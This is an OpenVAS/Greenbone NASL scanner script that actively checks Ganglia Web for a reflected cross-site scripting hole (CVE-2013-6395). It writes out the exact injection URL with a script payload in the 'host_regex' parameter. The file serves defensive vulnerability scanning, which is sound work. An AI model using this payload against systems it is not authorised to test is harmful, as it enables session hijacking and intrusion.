# SPDX-FileCopyrightText: 2013 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:ganglia:ganglia-web";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.803786");
  script_version("2024-11-27T05:05:40+0000");
  script_tag(name:"last_modification", value:"2024-11-27 05:05:40 +0000 (Wed, 27 Nov 2024)");
  script_tag(name:"creation_date", value:"2013-12-18 15:34:41 +0530 (Wed, 18 Dec 2013)");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");

  script_cve_id("CVE-2013-6395");

  script_tag(name:"qod_type", value:"remote_analysis");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("Ganglia Web < 3.5.11 XSS Vulnerability - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2013 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_ganglia_http_detect.nasl");
  script_mandatory_keys("ganglia/http/detected");
  script_require_ports("Services/www", 80);

  script_tag(name:"summary", value:"Ganglia Web is prone to a cross-site scripting (XSS)
  vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"Input passed via the 'host_regex' GET parameter to index.php
  (when 'c' is set to '1') is not properly sanitised before being returned to the user.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to execute
  arbitrary HTML and script code in a users browser session in context of an affected site and
  launch other attacks.");

  script_tag(name:"affected", value:"Ganglia Web version 3.5.10 and probably prior.");

  script_tag(name:"solution", value:"Update to version 3.5.11 or later.");

  script_xref(name:"URL", value:"http://secunia.com/advisories/55854");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/63921");
  script_xref(name:"URL", value:"http://seclists.org/oss-sec/2013/q4/346");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/89272");
  script_xref(name:"URL", value:"http://www.rusty-ice.de/advisory/advisory_2013002.txt");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");

if( ! port = get_app_port( cpe:CPE, service:"www" ) )
  exit( 0 );

if( ! dir = get_app_location( cpe:CPE, port:port ) )
  exit( 0 );

if( dir == "/" )
  dir = "";

url = dir + "/?r=custom&cs=1&ce=1&s=by+name&c=1&h=&host_regex='><script>" +
            "alert(document.cookie)</script>&max_graphs=0&tab=m&vn=&hide-hf=false&sh=1&z=small&hc=0";

if( http_vuln_check( port:port, url:url, check_header:TRUE,
    pattern:"host_regex value=''><script>alert\(document\.cookie\)</script>", extra_check:">Ganglia" ) ) {
  report = http_report_vuln_url( port:port, url:url );
  security_message( port:port, data:report );
  exit( 0 );
}

exit( 99 );
